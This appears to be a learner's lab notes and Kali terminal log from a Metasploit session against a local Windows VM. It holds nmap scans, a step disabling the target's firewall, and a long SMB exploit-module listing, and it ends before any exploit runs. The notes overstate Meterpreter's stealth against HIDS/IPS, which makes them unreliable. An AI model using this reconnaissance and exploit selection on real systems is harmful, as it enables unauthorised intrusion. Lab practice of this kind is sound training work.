Metasploitable - Meterpreter | Payload for win 

Working and Uses - 
Note - DLL file must for running software and file.
so Meterpreter bind-execute-add- in running process in OS.
Meterpreter does start new process, just bind itself in running processes. 
that's why these are not detected by any security devices ( HIDS,IPS,  )
HIDS - Host Intrusion Detection System - 
-------------------------------------------------
Through Meterpreter - can work multitasking,  
                                   - can work multisession.

---------------------------------------------------  
===========================================================
                                                                        
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Enable HTTP request and response logging with set HttpTrace 
true
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `                                                                
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o                                                                 
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy                                                                
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///                                                                 
                                `...............`              `...-/////...`                                                                   


                                  .::::::::::-.                     .::::::-                                                                    
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo                                                                   
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy                                                                   
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`                                                                   
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`                                                                    
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/                                                                     
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/                                                                      
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd                                                                       
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/                                                                       
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:                                                                       
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+                                                                      
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::                                                                       
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================                                                                
=====================+--------------------------------+=========================                                                                
=====================| Session one died of dysentery. |=========================                                                                
=====================+--------------------------------+=========================                                                                
================================================================================                                                                

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                

                        Press SPACE BAR to continue



       =[ metasploit v6.4.21-dev-                         ]
+ -- --=[ 2440 exploits - 1253 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > Interrupt: use the 'exit' command to quit
msf6 > 


===========================================================
---------------------------------------------------
msf6 > nmap -sV 192.168.44.160
------------------------------------
[*] exec: nmap -sV 192.168.44.160

Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 22:05 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.62 seconds
-------------------------------------
msf6 > nmap -sS 192.168.44.160
[*] exec: nmap -sS 192.168.44.160

You requested a scan type which requires root privileges.
QUITTING!
------------------------------------------
msf6 > sudo nmap -sS 192.168.44.160
[*] exec: sudo nmap -sS 192.168.44.160

[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 22:07 EDT
Nmap scan report for 192.168.44.160
Host is up (0.00030s latency).
All 1000 scanned ports on 192.168.44.160 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:0C:29:EE:7F:25 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 23.38 seconds
------------------------------------------
msf6 > sudo nmap -sS 192.168.44.160
[*] exec: sudo nmap -sS 192.168.44.160

Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 22:09 EDT
Nmap scan report for 192.168.44.160
Host is up (0.00056s latency).
All 1000 scanned ports on 192.168.44.160 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:0C:29:EE:7F:25 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 23.58 seconds
-------------------------------------------
========================================
========================================
Note -First  Turn of Win - Firewall     (Target/respond-victim machine)
========================================
========================================
msf6 > sudo nmap -sS 192.168.44.160
[*] exec: sudo nmap -sS 192.168.44.160

Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 22:11 EDT
Nmap scan report for 192.168.44.160
Host is up (0.00011s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1025/tcp open  NFS-or-IIS
MAC Address: 00:0C:29:EE:7F:25 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
msf6 > 
Note - search every service or version on google for more detail and  
knowing its vulnerable or not,  
and can we use exploit or payload. 
===================================================
===================================================
===================================================
===================================================
it is vulnerable port - 
445/tcp  open  microsoft-ds      
https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/smb-sharing-not-accessible-when-tcp-port-445-listen
------------------------------------------------------------------------------------
=======================================================================================

-------------------------------------------------------------------------------------------------------------------------------------------------
 ======================================================================================
======================================================================================================
======================================================================================================
======================================================================================================
======================================================================================================


msf6 > search smb
                                                                                                                                                                                             
Matching Modules                                                                                                                                                                             
================                                                                                                                                                                             
                                                                                                                                                                                             
   #    Name                                                                            Disclosure Date  Rank       Check  Description                                                       
   -    ----                                                                            ---------------  ----       -----  -----------                                                       
   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution      
   1      \_ target: Java                                                               .                .          .      .                                                                 
   2      \_ target: Linux                                                              .                .          .      .                                                                 
   3      \_ target: Windows                                                            .                .          .      .                                                                 
   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .                                                                 
   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution                     
   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .                                                                 
   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .                                                                 
   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB                                       
   9    post/linux/busybox/smb_share_root                                               .                normal     No     BusyBox SMB Sharing                                               
   10   exploit/linux/misc/cisco_rv340_sslvpn                                           2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution         
   11   auxiliary/scanner/http/citrix_dir_traversal                                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner                
   12   auxiliary/gather/crushftp_fileread_cve_2024_4040                                .                normal     Yes    CrushFTP Unauthenticated Arbitrary File Read                      
   13   auxiliary/scanner/smb/impacket/dcomexec                                         2018-03-19       normal     No     DCOM Exec                                                         
   14   auxiliary/scanner/smb/impacket/secretsdump                                      .                normal     No     DCOM Exec                                                         
   15   auxiliary/scanner/dcerpc/dfscoerce                                              .                normal     No     DFSCoerce                                                         
   16   exploit/windows/scada/ge_proficy_cimplicity_gefebt                              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   17   exploit/windows/smb/generic_smb_dll_injection                                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   18     \_ target: Windows x86                                                        .                .          .      .
   19     \_ target: Windows x64                                                        .                .          .      .
   20   exploit/windows/http/generic_http_dll_injection                                 2015-03-04       manual     No     Generic Web Application DLL Injection
   21     \_ target: Windows x86                                                        .                .          .      .
   22     \_ target: Windows x64                                                        .                .          .      .
   23   exploit/windows/smb/group_policy_startup                                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   24     \_ target: Windows x86                                                        .                .          .      .
   25     \_ target: Windows x64                                                        .                .          .      .
   26   exploit/windows/misc/hp_dataprotector_install_service                           2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
   27   exploit/windows/misc/hp_dataprotector_cmd_exec                                  2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
   28   auxiliary/server/http_ntlmrelay                                                 .                normal     No     HTTP Client MS Credential Relayer
   29   payload/cmd/windows/http/x64/custom/reverse_named_pipe                          .                normal     No     HTTP Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   30   payload/cmd/windows/http/x64/meterpreter/reverse_named_pipe                     .                normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   31   payload/cmd/windows/http/x64/peinject/reverse_named_pipe                        .                normal     No     HTTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   32   payload/cmd/windows/https/x64/custom/reverse_named_pipe                         .                normal     No     HTTPS Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   33   payload/cmd/windows/https/x64/meterpreter/reverse_named_pipe                    .                normal     No     HTTPS Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   34   payload/cmd/windows/https/x64/peinject/reverse_named_pipe                       .                normal     No     HTTPS Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   35   exploit/windows/smb/ipass_pipe_exec                                             2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   36     \_ target: Windows x32                                                        .                .          .      .
   37     \_ target: Windows x64                                                        .                .          .      .
   38   auxiliary/gather/konica_minolta_pwd_extract                                     .                normal     No     Konica Minolta Password Extractor
   39   auxiliary/fileformat/odt_badodt                                                 2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
   40   post/linux/gather/mount_cifs_creds                                              .                normal     No     Linux Gather Saved mount.cifs/mount.smbfs Credentials
   41   exploit/windows/smb/ms03_049_netapi                                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   42   exploit/windows/smb/ms04_007_killbill                                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   43   exploit/windows/smb/ms04_011_lsass                                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   44     \_ target: Automatic Targetting                                               .                .          .      .
   45     \_ target: Windows 2000 English                                               .                .          .      .
   46     \_ target: Windows XP English                                                 .                .          .      .
   47   exploit/windows/smb/ms04_031_netdde                                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
   48   exploit/windows/smb/ms05_039_pnp                                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   49     \_ target: Windows 2000 SP0-SP4                                               .                .          .      .
   50     \_ target: Windows 2000 SP4 French                                            .                .          .      .
   51     \_ target: Windows 2000 SP4 Spanish                                           .                .          .      .
   52     \_ target: Windows 2000 SP4 Universal                                         .                .          .      .
   53     \_ target: Windows 2000 SP0-SP4 German                                        .                .          .      .
   54     \_ target: Windows 2000 SP0-SP4 Italian                                       .                .          .      .
   55     \_ target: Windows XP SP1 English                                             .                .          .      .
   56     \_ target: Windows XP SP2 English (Requires Admin)                            .                .          .      .
   57     \_ target: Windows Server 2003 SP0 English (Requires Admin)                   .                .          .      .
   58     \_ target: Windows Server 2003 SP1 English (Requires Admin)                   .                .          .      .
   59   exploit/windows/smb/ms06_025_rras                                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   60     \_ target: Automatic                                                          .                .          .      .
   61     \_ target: Windows 2000 SP4                                                   .                .          .      .
   62     \_ target: Windows XP SP1                                                     .                .          .      .
   63   exploit/windows/smb/ms06_025_rasmans_reg                                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   64   exploit/windows/smb/ms06_040_netapi                                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   65     \_ target: (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)              .                .          .      .
   66     \_ target: (wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4                     .                .          .      .
   67     \_ target: (wcscpy) Windows XP SP0/SP1                                        .                .          .      .
   68     \_ target: (stack)  Windows XP SP1 English                                    .                .          .      .
   69     \_ target: (stack)  Windows XP SP1 Italian                                    .                .          .      .
   70     \_ target: (wcscpy) Windows 2003 SP0                                          .                .          .      .
   71   exploit/windows/smb/ms06_066_nwapi                                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   72   exploit/windows/smb/ms06_066_nwwks                                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   73   exploit/windows/smb/ms06_070_wkssvc                                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   74     \_ target: Automatic Targetting                                               .                .          .      .
   75     \_ target: Windows 2000 SP4                                                   .                .          .      .
   76     \_ target: Windows XP SP0/SP1                                                 .                .          .      .
   77   exploit/windows/smb/ms07_029_msdns_zonename                                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)                                                                                                                                                                                          
   78     \_ target: Automatic (2000 SP0-SP4, 2003 SP0-SP2)                             .                .          .      .
   79     \_ target: Windows 2000 Server SP0-SP4+ English                               .                .          .      .
   80     \_ target: Windows 2000 Server SP0-SP4+ French                                .                .          .      .
   81     \_ target: Windows 2000 Server SP0-SP4+ German                                .                .          .      .
   82     \_ target: Windows 2000 Server SP0-SP4+ Italian                               .                .          .      .
   83     \_ target: Windows 2000 Server SP0-SP4+ Polish                                .                .          .      .
   84     \_ target: Windows 2000 Server SP0-SP4+ Portuguese                            .                .          .      .
   85     \_ target: Windows 2000 Server SP0-SP4+ Korean                                .                .          .      .
   86     \_ target: Windows 2000 Server SP0-SP4+ Russian                               .                .          .      .
   87     \_ target: Windows 2000 Server SP0-SP4+ Simplified Chinese                    .                .          .      .
   88     \_ target: Windows 2000 Server SP0-SP4+ Spanish                               .                .          .      .
   89     \_ target: Windows 2000 Server SP0-SP4+ Swedish                               .                .          .      .
   90     \_ target: Windows 2000 Server SP0-SP4+ Traditional Chinese                   .                .          .      .
   91     \_ target: Windows 2000 Server SP0-SP4+ Turkish                               .                .          .      .
   92     \_ target: Windows 2003 Server SP0 English                                    .                .          .      .
   93     \_ target: Windows 2003 Server SP0 French                                     .                .          .      .
   94     \_ target: Windows 2003 Server SP1-SP2 English                                .                .          .      .
   95     \_ target: Windows 2003 Server SP1-SP2 French                                 .                .          .      .
   96     \_ target: Windows 2003 Server SP1-SP2 Spanish                                .                .          .      .
   97     \_ target: Windows 2003 Server SP1-SP2 Italian                                .                .          .      .
   98     \_ target: Windows 2003 Server SP1-SP2 German                                 .                .          .      .
   99     \_ target: Windows 2003 Server SP1-SP2 Russian                                .                .          .      .
   100    \_ target: Windows 2003 Server SP1-SP2 Simplified Chinese                     .                .          .      .
   101  exploit/windows/smb/ms08_067_netapi                                             2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   102    \_ target: Automatic Targeting                                                .                .          .      .
   103    \_ target: Windows 2000 Universal                                             .                .          .      .
   104    \_ target: Windows XP SP0/SP1 Universal                                       .                .          .      .
   105    \_ target: Windows 2003 SP0 Universal                                         .                .          .      .
   106    \_ target: Windows XP SP2 English (AlwaysOn NX)                               .                .          .      .
   107    \_ target: Windows XP SP2 English (NX)                                        .                .          .      .
   108    \_ target: Windows XP SP3 English (AlwaysOn NX)                               .                .          .      .
   109    \_ target: Windows XP SP3 English (NX)                                        .                .          .      .
   110    \_ target: Windows XP SP2 Arabic (NX)                                         .                .          .      .
   111    \_ target: Windows XP SP2 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
   112    \_ target: Windows XP SP2 Chinese - Simplified (NX)                           .                .          .      .
   113    \_ target: Windows XP SP2 Chinese - Traditional (NX)                          .                .          .      .
   114    \_ target: Windows XP SP2 Czech (NX)                                          .                .          .      .
   115    \_ target: Windows XP SP2 Danish (NX)                                         .                .          .      .
   116    \_ target: Windows XP SP2 German (NX)                                         .                .          .      .
   117    \_ target: Windows XP SP2 Greek (NX)                                          .                .          .      .
   118    \_ target: Windows XP SP2 Spanish (NX)                                        .                .          .      .
   119    \_ target: Windows XP SP2 Finnish (NX)                                        .                .          .      .
   120    \_ target: Windows XP SP2 French (NX)                                         .                .          .      .
   121    \_ target: Windows XP SP2 Hebrew (NX)                                         .                .          .      .
   122    \_ target: Windows XP SP2 Hungarian (NX)                                      .                .          .      .
   123    \_ target: Windows XP SP2 Italian (NX)                                        .                .          .      .
   124    \_ target: Windows XP SP2 Japanese (NX)                                       .                .          .      .
   125    \_ target: Windows XP SP2 Korean (NX)                                         .                .          .      .
   126    \_ target: Windows XP SP2 Dutch (NX)                                          .                .          .      .
   127    \_ target: Windows XP SP2 Norwegian (NX)                                      .                .          .      .
   128    \_ target: Windows XP SP2 Polish (NX)                                         .                .          .      .
   129    \_ target: Windows XP SP2 Portuguese - Brazilian (NX)                         .                .          .      .
   130    \_ target: Windows XP SP2 Portuguese (NX)                                     .                .          .      .
   131    \_ target: Windows XP SP2 Russian (NX)                                        .                .          .      .
   132    \_ target: Windows XP SP2 Swedish (NX)                                        .                .          .      .
   133    \_ target: Windows XP SP2 Turkish (NX)                                        .                .          .      .
   134    \_ target: Windows XP SP3 Arabic (NX)                                         .                .          .      .
   135    \_ target: Windows XP SP3 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
   136    \_ target: Windows XP SP3 Chinese - Simplified (NX)                           .                .          .      .
   137    \_ target: Windows XP SP3 Chinese - Traditional (NX)                          .                .          .      .
   138    \_ target: Windows XP SP3 Czech (NX)                                          .                .          .      .
   139    \_ target: Windows XP SP3 Danish (NX)                                         .                .          .      .
   140    \_ target: Windows XP SP3 German (NX)                                         .                .          .      .
   141    \_ target: Windows XP SP3 Greek (NX)                                          .                .          .      .
   142    \_ target: Windows XP SP3 Spanish (NX)                                        .                .          .      .
   143    \_ target: Windows XP SP3 Finnish (NX)                                        .                .          .      .
   144    \_ target: Windows XP SP3 French (NX)                                         .                .          .      .
   145    \_ target: Windows XP SP3 Hebrew (NX)                                         .                .          .      .
   146    \_ target: Windows XP SP3 Hungarian (NX)                                      .                .          .      .
   147    \_ target: Windows XP SP3 Italian (NX)                                        .                .          .      .
   148    \_ target: Windows XP SP3 Japanese (NX)                                       .                .          .      .
   149    \_ target: Windows XP SP3 Korean (NX)                                         .                .          .      .
   150    \_ target: Windows XP SP3 Dutch (NX)                                          .                .          .      .
   151    \_ target: Windows XP SP3 Norwegian (NX)                                      .                .          .      .
   152    \_ target: Windows XP SP3 Polish (NX)                                         .                .          .      .
   153    \_ target: Windows XP SP3 Portuguese - Brazilian (NX)                         .                .          .      .
   154    \_ target: Windows XP SP3 Portuguese (NX)                                     .                .          .      .
   155    \_ target: Windows XP SP3 Russian (NX)                                        .                .          .      .
   156    \_ target: Windows XP SP3 Swedish (NX)                                        .                .          .      .
   157    \_ target: Windows XP SP3 Turkish (NX)                                        .                .          .      .
   158    \_ target: Windows 2003 SP1 English (NO NX)                                   .                .          .      .
   159    \_ target: Windows 2003 SP1 English (NX)                                      .                .          .      .
   160    \_ target: Windows 2003 SP1 Japanese (NO NX)                                  .                .          .      .
   161    \_ target: Windows 2003 SP1 Spanish (NO NX)                                   .                .          .      .
   162    \_ target: Windows 2003 SP1 Spanish (NX)                                      .                .          .      .
   163    \_ target: Windows 2003 SP1 French (NO NX)                                    .                .          .      .
   164    \_ target: Windows 2003 SP1 French (NX)                                       .                .          .      .
   165    \_ target: Windows 2003 SP2 English (NO NX)                                   .                .          .      .
   166    \_ target: Windows 2003 SP2 English (NX)                                      .                .          .      .
   167    \_ target: Windows 2003 SP2 German (NO NX)                                    .                .          .      .
   168    \_ target: Windows 2003 SP2 German (NX)                                       .                .          .      .
   169    \_ target: Windows 2003 SP2 Portuguese (NX)                                   .                .          .      .
   170    \_ target: Windows 2003 SP2 Portuguese - Brazilian (NX)                       .                .          .      .
   171    \_ target: Windows 2003 SP2 Spanish (NO NX)                                   .                .          .      .
   172    \_ target: Windows 2003 SP2 Spanish (NX)                                      .                .          .      .
   173    \_ target: Windows 2003 SP2 Japanese (NO NX)                                  .                .          .      .
   174    \_ target: Windows 2003 SP2 French (NO NX)                                    .                .          .      .
   175    \_ target: Windows 2003 SP2 French (NX)                                       .                .          .      .
   176    \_ target: Windows 2003 SP2 Chinese - Simplified (NX)                         .                .          .      .
   177    \_ target: Windows 2003 SP2 Czech (NX)                                        .                .          .      .
   178    \_ target: Windows 2003 SP2 Dutch (NX)                                        .                .          .      .
   179    \_ target: Windows 2003 SP2 Hungarian (NX)                                    .                .          .      .
   180    \_ target: Windows 2003 SP2 Italian (NX)                                      .                .          .      .
   181    \_ target: Windows 2003 SP2 Russian (NX)                                      .                .          .      .
   182    \_ target: Windows 2003 SP2 Swedish (NX)                                      .                .          .      .
   183    \_ target: Windows 2003 SP2 Turkish (NX)                                      .                .          .      .
   184  exploit/windows/smb/smb_relay                                                   2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   185    \_ action: CREATE_SMB_SESSION                                                 .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   186    \_ action: PSEXEC                                                             .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   187    \_ target: Automatic                                                          .                .          .      .
   188    \_ target: PowerShell                                                         .                .          .      .
   189    \_ target: Native upload                                                      .                .          .      .
   190    \_ target: MOF upload                                                         .                .          .      .
   191    \_ target: Command                                                            .                .          .      .
   192  exploit/windows/smb/ms09_050_smb2_negotiate_func_index                          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   193  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32                           2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   194    \_ target: Automatic                                                          .                .          .      .
   195    \_ target: Internet Explorer on Windows                                       .                .          .      .
   196  exploit/windows/smb/ms10_061_spoolss                                            2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   197  exploit/windows/fileformat/ms13_071_theme                                       2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   198  exploit/windows/fileformat/ms14_060_sandworm                                    2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   199  exploit/windows/smb/ms17_010_eternalblue                                        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   200    \_ target: Automatic Target                                                   .                .          .      .
   201    \_ target: Windows 7                                                          .                .          .      .
   202    \_ target: Windows Embedded Standard 7                                        .                .          .      .
   203    \_ target: Windows Server 2008 R2                                             .                .          .      .
   204    \_ target: Windows 8                                                          .                .          .      .
   205    \_ target: Windows 8.1                                                        .                .          .      .
   206    \_ target: Windows Server 2012                                                .                .          .      .
   207    \_ target: Windows 10 Pro                                                     .                .          .      .
   208    \_ target: Windows 10 Enterprise Evaluation                                   .                .          .      .
   209  exploit/windows/smb/ms17_010_psexec                                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   210    \_ target: Automatic                                                          .                .          .      .
   211    \_ target: PowerShell                                                         .                .          .      .
   212    \_ target: Native upload                                                      .                .          .      .
   213    \_ target: MOF upload                                                         .                .          .      .
   214    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
   215    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
   216    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
   217    \_ AKA: ETERNALBLUE                                                           .                .          .      .
   218  auxiliary/admin/smb/ms17_010_command                                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   219    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
   220    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
   221    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
   222    \_ AKA: ETERNALBLUE                                                           .                .          .      .
   223  auxiliary/scanner/smb/smb_ms17_010                                              .                normal     No     MS17-010 SMB RCE Detection
   224    \_ AKA: DOUBLEPULSAR                                                          .                .          .      .
   225    \_ AKA: ETERNALBLUE                                                           .                .          .      .
   226  auxiliary/dos/windows/smb/ms05_047_pnp                                          .                normal     No     Microsoft Plug and Play Service Registry Overflow
   227  auxiliary/dos/windows/smb/rras_vls_null_deref                                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
   228  auxiliary/admin/mssql/mssql_ntlm_stealer                                        .                normal     No     Microsoft SQL Server NTLM Stealer
   229  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                   .                normal     No     Microsoft SQL Server SQLi NTLM Stealer
   230  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                           .                normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   231  auxiliary/admin/mssql/mssql_enum_domain_accounts                                .                normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   232  auxiliary/dos/windows/smb/ms06_035_mailslot                                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
   233  auxiliary/dos/windows/smb/ms06_063_trans                                        .                normal     No     Microsoft SRV.SYS Pipe Transaction No Null
   234  auxiliary/dos/windows/smb/ms09_001_write                                        .                normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   235  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                       .                normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   236  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                          .                normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   237  auxiliary/dos/windows/smb/vista_negotiate_stop                                  .                normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   238  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                      .                normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   239  auxiliary/scanner/smb/psexec_loggedin_users                                     .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   240  exploit/windows/smb/psexec                                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   241    \_ target: Automatic                                                          .                .          .      .
   242    \_ target: PowerShell                                                         .                .          .      .
   243    \_ target: Native upload                                                      .                .          .      .
   244    \_ target: MOF upload                                                         .                .          .      .
   245    \_ target: Command                                                            .                .          .      .
   246  auxiliary/dos/windows/smb/ms11_019_electbowser                                  .                normal     No     Microsoft Windows Browser Pool DoS
   247  exploit/windows/smb/smb_rras_erraticgopher                                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
   248    \_ target: Automatic                                                          .                .          .      .
   249    \_ target: Windows Server 2003 SP0 (English)                                  .                .          .      .
   250    \_ target: Windows Server 2003 SP1 (English) (NX)                             .                .          .      .
   251    \_ target: Windows Server 2003 SP2 (English) (NX)                             .                .          .      .
   252    \_ target: Windows Server 2003 R2 SP2 (English) (NX)                          .                .          .      .
   253  exploit/windows/smb/smb_shadow                                                  2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
   254  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                        .                normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   255  exploit/windows/smb/ms10_046_shortcut_icon_dllloader                            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   256  exploit/windows/smb/ms15_020_shortcut_icon_dllloader                            2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   257  auxiliary/docx/word_unc_injector                                                .                normal     No     Microsoft Word UNC Path Injector
   258  auxiliary/spoof/nbns/nbns_response                                              .                normal     No     NetBIOS Name Service Spoofer
   259  exploit/windows/smb/netidentity_xtierrpcpipe                                    2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   260  exploit/netware/smb/lsass_cifs                                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
   261    \_ target: Automatic                                                          .                .          .      .
   262    \_ target: VMware                                                             .                .          .      .
   263    \_ target: NetWare 6.5 SP2                                                    .                .          .      .
   264    \_ target: NetWare 6.5 SP3                                                    .                .          .      .
   265    \_ target: NetWare 6.5 SP4                                                    .                .          .      .
   266    \_ target: NetWare 6.5 SP5                                                    .                .          .      .
   267    \_ target: NetWare 6.5 SP6                                                    .                .          .      .
